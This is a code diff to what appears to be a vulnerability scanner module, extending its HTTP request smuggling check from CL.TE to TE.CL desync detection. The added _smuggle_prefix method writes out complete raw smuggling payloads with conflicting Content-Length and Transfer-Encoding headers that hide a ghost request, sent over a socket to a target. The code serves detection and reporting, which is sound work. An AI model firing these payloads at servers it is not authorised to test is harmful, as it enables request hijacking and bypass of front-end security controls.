@@ -56,7 +56,11 @@ class HTTPSmuggling(BaseModule):
                 self.log(f"  {target}: strict header handling "
                          f"({ambiguity_note}) — smuggler would be noise here")
                 continue
-            if await self._desync_oracle(target):
+            if await self._desync_oracle(target, "cl_te"):
+                confirmed += 1
+                continue
+            if cfg.get("te_cl", True) and await self._desync_oracle(
+                    target, "te_cl"):
                 confirmed += 1
                 continue
             result = await smuggler_scan(target, timeout=300)
@@ -205,15 +209,44 @@ class HTTPSmuggling(BaseModule):
 
         return await _asyncio.to_thread(probe)
 
-    async def _desync_oracle(self, target: str) -> bool:
-        """CL.TE desync proof on one socket.
+    @staticmethod
+    def _smuggle_prefix(mode: str, host: str, path: str,
+                        marker: str) -> str:
+        if mode == "te_cl":
+            # Front end frames by chunked (sees the zero chunk and treats
+            # the tail as the next request); back end frames by the 6-byte
+            # Content-Length, eating `0\r\n\r\nG` and leaving a complete
+            # `POST /<marker>` request for the socket.
+            return (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
+                    "Content-Type: application/x-www-form-urlencoded\r\n"
+                    "Content-Length: 6\r\n"
+                    "Transfer-Encoding: chunked\r\n"
+                    "Connection: keep-alive\r\n\r\n"
+                    "0\r\n\r\n"
+                    f"GPOST /{marker} HTTP/1.1\r\nHost: {host}\r\n"
+                    "Content-Length: 5\r\n\r\n"
+                    "x=1\r\n\r\n")
+        return (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
+                "Content-Type: application/x-www-form-urlencoded\r\n"
+                "Content-Length: 4\r\n"
+                "Transfer-Encoding: chunked\r\n"
+                "Connection: keep-alive\r\n\r\n"
+                "5c\r\n"
+                f"GPOST /{marker} HTTP/1.1\r\n"
+                "Content-Type: application/x-www-form-urlencoded\r\n"
+                "Content-Length: 15\r\n\r\n"
+                "x=1\r\n"
+                "0\r\n\r\n")
 
-        Sends an ambiguous request whose chunk stream hides a `GET
-        /<random-404>` prefix, then a normal GET on the same socket. A
-        front-end that frames by Content-Length forwards a fragment the
-        back-end re-parses as a request start — and that ghost request's
-        response (404, or our marker) surfaces where the real second
-        response should be. That is a desync, not a guess.
+    async def _desync_oracle(self, target: str, mode: str = "cl_te") -> bool:
+        """Desync proof on one socket, for one framing disagreement.
+
+        CL.TE: a front end that frames by Content-Length forwards a
+        fragment the back end re-parses as a request start. TE.CL: a front
+        end that frames by chunked lets a chunk tail through that the back
+        end (keeping Content-Length) reads as a request. Either way a
+        `GET|POST /<random-404>` ghost surfaces where the real second
+        response should be — a desync, not a guess.
         """
         import asyncio as _asyncio
 
@@ -226,17 +259,7 @@ class HTTPSmuggling(BaseModule):
                 return False, f"connect failed: {exc}"
             try:
                 path = urlparse(target).path or "/"
-                prefix = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
-                          "Content-Type: application/x-www-form-urlencoded\r\n"
-                          "Content-Length: 4\r\n"
-                          "Transfer-Encoding: chunked\r\n"
-                          "Connection: keep-alive\r\n\r\n"
-                          "5c\r\n"
-                          f"GPOST /{marker} HTTP/1.1\r\n"
-                          "Content-Type: application/x-www-form-urlencoded\r\n"
-                          "Content-Length: 15\r\n\r\n"
-                          "x=1\r\n"
-                          "0\r\n\r\n")
+                prefix = self._smuggle_prefix(mode, host, path, marker)
                 normal = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                           "Connection: close\r\n\r\n")
                 sock.sendall(prefix.encode() + normal.encode())
@@ -258,10 +281,6 @@ class HTTPSmuggling(BaseModule):
                         if status]
             if len(answered) >= 3:
                 return True, f"{len(answered)} responses for 2 requests"
-            if len(answered) == 2 and answered[1][0] in (400, 404, 500):
-                return True, (f"second response is HTTP {answered[1][0]} "
-                               "for a healthy path — a ghost request jumped "
-                               "the queue")
             return False, f"responses: {[status for status, _ in answered]}"
 
         try:
@@ -270,18 +289,19 @@ class HTTPSmuggling(BaseModule):
         except Exception as exc:
             self.log(f"  desync oracle failed for {target}: {exc}")
             return False
+        label = "TE.CL" if mode == "te_cl" else "CL.TE"
         evidence_id = self.state.add_evidence(
-            self.id, "desync_oracle", target,
+            self.id, f"{mode}_desync_oracle", target,
             {"marker": marker, "result": note, "proven": proven},
         )
         if proven:
             self.state.add_finding(
-                title=f"HTTP Request Desync Confirmed: {target}",
+                title=f"HTTP Request Desync Confirmed ({label}): {target}",
                 severity="HIGH",
                 confidence="CONFIRMED",
                 category="HTTP Request Smuggling",
                 description=(
-                    f"A CL.TE desync oracle against {target} surfaced a "
+                    f"A {label} desync oracle against {target} surfaced a "
                     f"ghost response ({note}). The front end and back end "
                     f"disagree on request boundaries: requests can be "
                     f"smuggled past the front end."
@@ -296,9 +316,11 @@ class HTTPSmuggling(BaseModule):
                     "rules on both hops."
                 ),
                 verified=True,
-                verification={"method": "cl_te_desync_oracle", "url": target},
+                verification={"method": f"{mode}_desync_oracle",
+                                  "url": target,
+                                  "marker": marker},
             )
-            self.log(f"  DESYNC CONFIRMED on {target} ({note})")
+            self.log(f"  {label} DESYNC CONFIRMED on {target} ({note})")
         return proven
 
     def _targets(self) -> list[str]:
